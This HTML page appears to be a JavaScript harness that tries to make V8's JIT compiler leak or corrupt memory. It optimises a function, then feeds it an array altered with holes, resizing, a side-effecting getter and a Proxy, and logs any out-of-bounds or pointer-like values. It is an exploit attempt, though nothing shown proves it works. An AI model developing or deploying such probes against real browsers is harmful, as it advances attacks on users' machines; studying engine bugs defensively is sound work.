<!doctype html>
<meta charset="utf-8">
<title>V8 Leak Controlled Chaos</title>

<pre id="log"></pre>
<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

function vuln(a,i){ return a[i] + 1.1; }

// ===== WARMUP =====
function warmup(){
  let arr = Array.from({length:30}, (_,i)=>i+0.5);
  for(let i=0;i<80000;i++){
    vuln(arr, i % 30);
  }
  return arr;
}

// ===== MUTATE =====
function mutate(arr){
  // holes
  for(let i=0;i<5;i++) delete arr[i];

  // shrink & expand
  arr.length = 10;
  arr[60] = 13.37;

  // mix types
  arr[2] = {x:1};

  // getter with controlled side effect
  let counter = 0;
  Object.defineProperty(arr,3,{
    get(){
      if(counter++ < 3){
        arr.push(99.99 + counter);
      }
      return 1.1;
    }
  });

  return arr;
}

// ===== PROXY =====
function breakAssumption(a){
  let toggle = 0;
  return new Proxy(a,{
    get(t,p){
      if(p==="length"){
        if(toggle++ % 2 === 0){
          t.push(77.77);
        }
      }
      return Reflect.get(t,p);
    }
  });
}

// ===== TYPED ARRAY =====
let buf = new ArrayBuffer(0x4000);
let f64 = new Float64Array(buf);

// baseline
for(let i=0;i<f64.length;i++){
  f64[i] = 0x41414141 + i;
}

// ===== MAIN =====
function run(){
  log("[*] warmup");
  let base = warmup();

  log("[*] trigger");

  let arr = [...base];
  arr = mutate(arr);
  arr = breakAssumption(arr);

  // multiple trigger
  let r1 = vuln(arr,3);
  let r2 = vuln(arr,10);
  let r3 = vuln(arr,60);

  log("r1="+r1);
  log("r2="+r2);
  log("r3="+r3);

  // ===== OOB CHECK =====
  for(let i=0;i<50;i++){
    let idx = arr.length + i;
    let v = arr[idx];

    if(v !== undefined){
      log("[OOB] "+idx+" = "+v);
    }

    if(typeof v === "number" && Math.abs(v) > 1e12){
      log("[PTR] "+v);
    }
  }

  // ===== MEMORY DIFF =====
  for(let i=0;i<100;i++){
    let v = f64[i];

    if(v !== 0x41414141 + i){
      log("[CORRUPTION] "+i+" = "+v);
    }
  }

  log("[*] done");
}

run();
</script>
